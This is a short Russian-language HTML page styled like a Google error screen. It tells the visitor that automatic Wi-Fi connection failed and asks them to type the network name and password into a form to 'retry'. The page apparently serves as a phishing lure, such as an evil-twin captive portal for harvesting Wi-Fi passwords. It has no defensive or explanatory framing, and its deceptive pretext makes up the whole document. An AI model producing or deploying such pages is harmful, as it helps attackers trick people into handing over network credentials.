<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Статус подключения</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #ffffff;
            padding: 40px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            max-width: 380px;
            width: 100%;
            box-sizing: border-box;
        }
        .error-icon {
            color: #d93025;
            font-size: 24px;
            margin-bottom: 10px;
        }
        h1 {
            font-size: 22px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 10px 0;
        }
        p {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.5;
            margin: 0 0 30px 0;
        }
        .input-wrapper {
            position: relative;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 14px;
            font-size: 14px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.15s;
        }
        input:focus {
            border-color: #1a73e8;
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            float: right;
            transition: background-color 0.15s;
        }
        button:hover {
            background-color: #1557b0;
        }
        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="error-icon">⚠️</div>
        <h1>Проблема с Wi-Fi</h1>
        <p>Не удалось установить автоматическое соединение. Чтобы восстановить доступ к сети, введите параметры конфигурации вручную.</p>
        
        <form action="#" method="POST" class="clearfix">
            <div class="input-wrapper">
                <input type="text" name="network_name" placeholder="Имя сети (SSID)" required autocomplete="off">
            </div>
            
            <div class="input-wrapper">
                <input type="password" name="network_password" placeholder="Пароль" required>
            </div>
            
            <button type="submit">Повторить попытку</button>
        </form>
    </div>

</body>
</html>
